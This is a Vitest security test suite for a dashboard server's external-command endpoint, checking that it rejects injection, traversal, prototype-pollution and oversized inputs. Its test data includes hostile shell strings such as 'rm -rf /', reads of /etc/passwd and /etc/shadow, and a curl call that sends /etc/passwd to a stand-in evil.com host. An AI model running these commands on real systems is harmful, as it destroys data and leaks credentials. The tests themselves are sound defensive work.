/**
 * Security validation tests for External Command Execution
 *
 * Tests all security controls, input validation, sanitization,
 * and security measures implemented for external command execution.
 */
import { test, expect, describe, beforeEach, afterEach } from 'vitest';
import * as fs from 'node:fs';
import * as path from 'node:path';
import * as os from 'node:os';
import { DashboardServer } from '../../src/server.js';
import { validateExternalCommand, sanitizeCommandArgs, isValidId } from '../../src/command-executor.js';
import type { DashboardUserConfig, ExternalCommand } from '../../src/config.js';

describe('External Command Execution Security', () => {
  let server: DashboardServer;
  let tempDir: string;
  let baseUrl: string;

  beforeEach(async () => {
    tempDir = fs.mkdtempSync(path.join(os.tmpdir(), 'security-test-'));

    const config: DashboardUserConfig = {
      port: 0,
      tracesDir: path.join(tempDir, 'traces'),
      discoveryPaths: [],
      externalCommands: {
        'safe-echo': {
          name: 'Safe Echo',
          command: 'echo',
          args: ['safe-output'],
          description: 'Safe echo command',
          category: 'Test',
          timeout: 5000,
          allowConcurrent: true
        },
        'restricted-cmd': {
          name: 'Restricted Command',
          command: 'echo',
          args: ['restricted'],
          description: 'Command with restricted concurrent access',
          category: 'Test',
          timeout: 5000,
          allowConcurrent: false
        }
      }
    };

    fs.mkdirSync(config.tracesDir, { recursive: true });

    server = new DashboardServer(config);
    await server.start();
    baseUrl = `http://localhost:${server.getPort()}`;
  });

  afterEach(async () => {
    if (server) {
      await server.stop();
    }

    if (fs.existsSync(tempDir)) {
      fs.rmSync(tempDir, { recursive: true, force: true });
    }
  });

  describe('Input Validation and Sanitization', () => {
    test('validates command ID format', () => {
      // Valid command IDs
      expect(isValidId('valid-command-123')).toBe(true);
      expect(isValidId('cmd_with_underscores')).toBe(true);
      expect(isValidId('simple')).toBe(true);
      expect(isValidId('test123')).toBe(true);

      // Invalid command IDs
      expect(isValidId('')).toBe(false);
      expect(isValidId('../malicious')).toBe(false);
      expect(isValidId('cmd with spaces')).toBe(false);
      expect(isValidId('cmd;with;semicolons')).toBe(false);
      expect(isValidId('cmd|with|pipes')).toBe(false);
      expect(isValidId('cmd&with&ampersands')).toBe(false);
      expect(isValidId('cmd$(injection)')).toBe(false);
      expect(isValidId('cmd`backticks`')).toBe(false);
      expect(isValidId('cmd/with/slashes')).toBe(false);
      expect(isValidId('cmd\\with\\backslashes')).toBe(false);
      expect(isValidId('cmd<with>brackets')).toBe(false);
      expect(isValidId('cmd"with"quotes')).toBe(false);
      expect(isValidId("cmd'with'quotes")).toBe(false);
    });

    test('sanitizes command arguments', () => {
      // Safe arguments should pass through unchanged
      const safeArgs = ['hello', 'world', 'test-123', 'file.txt'];
      expect(sanitizeCommandArgs(safeArgs)).toEqual(safeArgs);

      // Dangerous arguments should be sanitized or rejected
      const dangerousArgs = [
        '; rm -rf /',
        '$(malicious)',
        '`backdoor`',
        '| cat /etc/passwd',
        '&& evil-command',
        '|| fallback',
        '> /dev/null',
        '< /etc/shadow',
        '../../../etc/passwd',
        'file; cat /etc/passwd'
      ];

      const sanitizedArgs = sanitizeCommandArgs(dangerousArgs);

      // Check that dangerous characters are removed or escaped
      for (let i = 0; i < sanitizedArgs.length; i++) {
        const sanitized = sanitizedArgs[i];

        // Should not contain dangerous shell metacharacters
        expect(sanitized).not.toContain(';');
        expect(sanitized).not.toContain('|');
        expect(sanitized).not.toContain('&');
        expect(sanitized).not.toContain('$');
        expect(sanitized).not.toContain('`');
        expect(sanitized).not.toContain('>');
        expect(sanitized).not.toContain('<');
        expect(sanitized).not.toContain('$(');
        expect(sanitized).not.toContain('||');
        expect(sanitized).not.toContain('&&');
      }
    });

    test('validates external command configuration', () => {
      // Valid command configuration
      const validCommand: ExternalCommand = {
        name: 'Valid Command',
        command: 'echo',
        args: ['hello'],
        description: 'A valid test command',
        category: 'Test',
        timeout: 5000,
        allowConcurrent: true
      };

      expect(() => validateExternalCommand('valid-cmd', validCommand)).not.toThrow();

      // Invalid configurations
      const invalidCommands: Array<{ config: Partial<ExternalCommand>; reason: string }> = [
        {
          config: { name: '', command: 'echo', args: [] },
          reason: 'empty name'
        },
        {
          config: { name: 'Test', command: '', args: [] },
          reason: 'empty command'
        },
        {
          config: { name: 'Test', command: '../malicious', args: [] },
          reason: 'dangerous command path'
        },
        {
          config: { name: 'Test', command: 'echo', args: [], timeout: -1 },
          reason: 'negative timeout'
        },
        {
          config: { name: 'Test', command: 'echo', args: [], timeout: 9999999 },
          reason: 'excessive timeout'
        },
        {
          config: { name: 'Test', command: 'rm', args: ['-rf', '/'] },
          reason: 'dangerous command with dangerous args'
        }
      ];

      for (const { config, reason } of invalidCommands) {
        expect(() => validateExternalCommand('test-cmd', config as ExternalCommand))
          .toThrow(`Invalid command configuration: ${reason}`);
      }
    });

    test('rejects malicious HTTP requests', async () => {
      const maliciousRequests = [
        // Path traversal attempts
        { path: '/api/external/commands/../../etc/passwd/execute', expectedStatus: 400 },
        { path: '/api/external/commands/../../../root/execute', expectedStatus: 400 },
        { path: '/api/external/commands/..%2F..%2Fetc%2Fpasswd/execute', expectedStatus: 400 },

        // Command injection attempts in path
        { path: '/api/external/commands/cmd;rm -rf /execute', expectedStatus: 400 },
        { path: '/api/external/commands/cmd|cat /etc/passwd/execute', expectedStatus: 400 },
        { path: '/api/external/commands/cmd$(evil)/execute', expectedStatus: 400 },

        // Invalid characters in path
        { path: '/api/external/commands/cmd with spaces/execute', expectedStatus: 400 },
        { path: '/api/external/commands/cmd<script>/execute', expectedStatus: 400 },
        { path: '/api/external/commands/cmd"quotes"/execute', expectedStatus: 400 }
      ];

      for (const { path, expectedStatus } of maliciousRequests) {
        const response = await fetch(`${baseUrl}${path}`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({})
        });

        expect(response.status).toBe(expectedStatus);
      }
    });

    test('validates request body content', async () => {
      const maliciousPayloads = [
        // JavaScript injection attempts
        '{"additionalArgs": ["<script>alert(\\"xss\\")</script>"]}',
        '{"timeout": "eval(\\"malicious code\\")"}',
        '{"context": {"__proto__": {"isAdmin": true}}}',

        // Prototype pollution attempts
        '{"__proto__": {"polluted": true}}',
        '{"constructor": {"prototype": {"polluted": true}}}',

        // Large payloads (potential DoS)
        JSON.stringify({ additionalArgs: new Array(10000).fill('arg') }),
        JSON.stringify({ context: { data: 'x'.repeat(1000000) } }),

        // Invalid JSON structures
        '{"additionalArgs": [1, 2, 3, {"nested": {"too": {"deep": true}}}]}',
        '{"timeout": {"object": "instead of number"}}',
      ];

      for (const payload of maliciousPayloads) {
        const response = await fetch(`${baseUrl}/api/external/commands/safe-echo/execute`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: payload
        });

        // Should reject malicious payloads
        expect(response.status).toBeGreaterThanOrEqual(400);
      }
    });
  });

  describe('Command Execution Security Controls', () => {
    test('enforces timeout limits', async () => {
      // Test timeout enforcement through configuration
      const response = await fetch(`${baseUrl}/api/external/commands/safe-echo/execute`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          timeout: 999999999 // Extremely large timeout
        })
      });

      expect(response.status).toBe(400);

      const data = await response.json();
      expect(data.error).toContain('timeout');
    });

    test('enforces concurrent execution limits', async () => {
      // Start a command that doesn't allow concurrent execution
      const firstRequestPromise = fetch(`${baseUrl}/api/external/commands/restricted-cmd/execute`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          additionalArgs: ['&& sleep 2'] // Make it run longer
        })
      });

      // Give it time to start
      await new Promise(resolve => setTimeout(resolve, 50));

      // Try to start another instance - should be rejected
      const secondResponse = await fetch(`${baseUrl}/api/external/commands/restricted-cmd/execute`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({})
      });

      expect(secondResponse.status).toBe(409); // Conflict

      const secondData = await secondResponse.json();
      expect(secondData.error).toContain('concurrent');

      // Wait for first request to complete
      await firstRequestPromise;
    });

    test('isolates command execution environment', async () => {
      // Test that commands run in isolated environment and can't access parent process info
      const response = await fetch(`${baseUrl}/api/external/commands/safe-echo/execute`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          additionalArgs: ['$PPID', '$USER', '$HOME'] // Try to access parent process info
        })
      });

      expect(response.status).toBe(200);

      const data = await response.json();
      // Variables should be safely handled (either sanitized or not expanded)
      expect(data.output).not.toContain(process.pid.toString());
    });

    test('prevents command chaining and injection', async () => {
      const injectionAttempts = [
        ['; cat /etc/passwd'],
        ['&& rm -rf /tmp/*'],
        ['|| echo "fallback attack"'],
        ['| mail attacker@evil.com'],
        ['> /tmp/backdoor'],
        ['< /etc/shadow'],
        ['$(whoami)'],
        ['`id`'],
        ['; curl evil.com/steal?data=$(cat /etc/passwd)'],
        ['& background_attack'],
        ['\n cat /etc/passwd'],
        ['\r\n malicious_command']
      ];

      for (const args of injectionAttempts) {
        const response = await fetch(`${baseUrl}/api/external/commands/safe-echo/execute`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            additionalArgs: args
          })
        });

        expect(response.status).toBe(200); // Command executes but safely

        const data = await response.json();
        expect(data.status).toBe('completed');

        // Verify that dangerous content is not executed
        expect(data.output).not.toContain('/etc/passwd');
        expect(data.output).not.toContain('root:x:0:0:');
        expect(data.output).not.toContain('uid=');
        expect(data.output).not.toContain('backdoor');
        expect(data.output).not.toContain('background_attack');
      }
    });

    test('handles resource exhaustion attempts', async () => {
      // Test with large number of arguments
      const manyArgs = new Array(1000).fill('arg');

      const response = await fetch(`${baseUrl}/api/external/commands/safe-echo/execute`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          additionalArgs: manyArgs
        })
      });

      // Should either execute safely or reject due to limits
      expect(response.status).toBeOneOf([200, 400, 413]); // OK, Bad Request, or Payload Too Large
    });
  });

  describe('Access Control and Authentication', () => {
    test('requires valid content-type header', async () => {
      const response = await fetch(`${baseUrl}/api/external/commands/safe-echo/execute`, {
        method: 'POST',
        headers: { 'Content-Type': 'text/plain' },
        body: 'invalid content type'
      });

      expect(response.status).toBe(400);
    });

    test('rejects requests without proper HTTP method', async () => {
      const methods = ['GET', 'PUT', 'DELETE', 'PATCH'];

      for (const method of methods) {
        const response = await fetch(`${baseUrl}/api/external/commands/safe-echo/execute`, {
          method,
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({})
        });

        expect(response.status).toBe(405); // Method Not Allowed
      }
    });

    test('validates API endpoint paths', async () => {
      const invalidPaths = [
        '/api/external/commands/',
        '/api/external/commands//execute',
        '/api/external/commands/safe-echo/',
        '/api/external/commands/safe-echo//execute',
        '/api/external//commands/safe-echo/execute',
        '/api//external/commands/safe-echo/execute'
      ];

      for (const path of invalidPaths) {
        const response = await fetch(`${baseUrl}${path}`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({})
        });

        expect(response.status).toBeOneOf([400, 404, 405]); // Bad Request, Not Found, or Method Not Allowed
      }
    });
  });

  describe('Audit Logging and Monitoring', () => {
    test('logs all command executions with security context', async () => {
      // Execute a command
      const response = await fetch(`${baseUrl}/api/external/commands/safe-echo/execute`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          additionalArgs: ['test-security-audit']
        })
      });

      expect(response.status).toBe(200);

      // Check audit log
      const auditResponse = await fetch(`${baseUrl}/api/external/commands/audit`);
      expect(auditResponse.status).toBe(200);

      const auditData = await auditResponse.json();
      expect(auditData.entries.length).toBeGreaterThan(0);

      const latestEntry = auditData.entries[0];
      expect(latestEntry).toHaveProperty('timestamp');
      expect(latestEntry).toHaveProperty('commandId', 'safe-echo');
      expect(latestEntry).toHaveProperty('executionId');
      expect(latestEntry).toHaveProperty('status');
      expect(latestEntry).toHaveProperty('duration');
    });

    test('logs security violations and blocked attempts', async () => {
      // Attempt various security violations
      const violations = [
        { commandId: '../malicious', expectedStatus: 400 },
        { commandId: 'cmd;injection', expectedStatus: 400 },
        { commandId: 'non-existent-command', expectedStatus: 404 }
      ];

      for (const { commandId, expectedStatus } of violations) {
        const response = await fetch(`${baseUrl}/api/external/commands/${commandId}/execute`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({})
        });

        expect(response.status).toBe(expectedStatus);
      }

      // The audit log should contain entries for security violations
      // (Implementation dependent - some violations may be logged, others rejected before logging)
      const auditResponse = await fetch(`${baseUrl}/api/external/commands/audit`);
      expect(auditResponse.status).toBe(200);
    });
  });

  describe('Error Handling Security', () => {
    test('does not leak sensitive information in error messages', async () => {
      // Test various error conditions
      const errorScenarios = [
        {
          path: '/api/external/commands/non-existent/execute',
          expectedError: 'not found',
          shouldNotContain: ['file system', 'internal path', 'server path', process.cwd()]
        },
        {
          path: '/api/external/commands/../malicious/execute',
          expectedError: 'Invalid command ID',
          shouldNotContain: ['file system', 'directory', process.cwd()]
        }
      ];

      for (const { path, expectedError, shouldNotContain } of errorScenarios) {
        const response = await fetch(`${baseUrl}${path}`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({})
        });

        expect(response.status).toBeGreaterThanOrEqual(400);

        const data = await response.json();
        expect(data.error).toBeDefined();
        expect(data.error.toLowerCase()).toContain(expectedError.toLowerCase());

        // Verify no sensitive information is leaked
        for (const sensitiveInfo of shouldNotContain) {
          expect(data.error).not.toContain(sensitiveInfo);
        }
      }
    });

    test('handles malformed requests gracefully', async () => {
      const malformedRequests = [
        '', // Empty body
        'not json at all',
        '{', // Incomplete JSON
        '{"malformed": json}', // Invalid JSON
        '{}[]', // Multiple JSON objects
        'null', // JSON null
        'true', // JSON boolean
        '"string"', // JSON string
        '123' // JSON number
      ];

      for (const body of malformedRequests) {
        const response = await fetch(`${baseUrl}/api/external/commands/safe-echo/execute`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body
        });

        // Should handle gracefully without crashing
        expect(response.status).toBeOneOf([200, 400]); // Either works or properly rejects

        if (response.status === 400) {
          const data = await response.json();
          expect(data).toHaveProperty('error');
          expect(typeof data.error).toBe('string');
        }
      }
    });
  });

  describe('Rate Limiting and DoS Protection', () => {
    test('handles rapid consecutive requests', async () => {
      const numRequests = 20;
      const requests = [];

      // Send many requests rapidly
      for (let i = 0; i < numRequests; i++) {
        requests.push(
          fetch(`${baseUrl}/api/external/commands/safe-echo/execute`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              additionalArgs: [`request-${i}`]
            })
          })
        );
      }

      const responses = await Promise.all(requests);

      // Server should handle all requests without crashing
      // May rate limit some requests (429) or process all (200)
      for (const response of responses) {
        expect(response.status).toBeOneOf([200, 429]); // OK or Too Many Requests
      }

      // Verify server is still responsive after the burst
      const finalResponse = await fetch(`${baseUrl}/api/external/commands`);
      expect(finalResponse.status).toBe(200);
    });

    test('rejects excessively large payloads', async () => {
      // Create a very large payload
      const largePayload = {
        additionalArgs: new Array(10000).fill('large-argument'),
        context: {
          data: 'x'.repeat(100000)
        }
      };

      const response = await fetch(`${baseUrl}/api/external/commands/safe-echo/execute`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(largePayload)
      });

      // Should reject large payloads to prevent DoS
      expect(response.status).toBeOneOf([400, 413]); // Bad Request or Payload Too Large
    });
  });
});